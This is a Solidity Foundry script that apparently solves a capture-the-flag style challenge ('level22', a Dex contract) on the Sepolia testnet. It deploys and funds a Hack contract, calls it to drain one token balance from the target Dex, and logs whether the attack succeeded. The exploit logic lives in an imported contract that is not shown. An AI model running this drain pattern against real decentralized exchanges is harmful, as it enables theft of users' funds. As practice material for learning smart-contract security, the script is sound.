// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, IDex} from "../src/level22.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Level22Script is Script {
    function run(address instanceAddress) external {
        IDex target = IDex(instanceAddress);
        address t1 = target.token1();
        address t2 = target.token2();
        IERC20 token1 = IERC20(t1);
        IERC20 token2 = IERC20(t2);

        {
            uint256 dexBal1Before = target.balanceOf(t1, address(target));
            uint256 dexBal2Before = target.balanceOf(t2, address(target));
            console.log("Dex token1 balance before:", dexBal1Before);
            console.log("Dex token2 balance before:", dexBal2Before);
        }

        uint256 senderBal1 = token1.balanceOf(msg.sender);
        uint256 senderBal2 = token2.balanceOf(msg.sender);

        console.log("Sender address (msg.sender):", msg.sender);
        console.log("Token addresses - t1:", t1, "t2:", t2);
        console.log("Sender token1 balance:", senderBal1);
        console.log("Sender token2 balance:", senderBal2);

        require(
            senderBal1 > 0 || senderBal2 > 0,
            "Sender has no tokens! Ensure --sender points to the address with tokens."
        );

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);

        if (senderBal1 > 0) {
            token1.transfer(address(hackContract), senderBal1);
        }
        if (senderBal2 > 0) {
            token2.transfer(address(hackContract), senderBal2);
        }

        hackContract.hack();
        vm.stopBroadcast();

        {
            uint256 dexBal1After = target.balanceOf(t1, address(target));
            uint256 dexBal2After = target.balanceOf(t2, address(target));
            console.log("Dex token1 balance after:", dexBal1After);
            console.log("Dex token2 balance after:", dexBal2After);
            console.log(
                "Attack successful:",
                dexBal1After == 0 || dexBal2After == 0
            );
        }
    }
}

//forge script script/level22.s.sol:Level22Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sender yourkey --sig "run(address)" your instance address
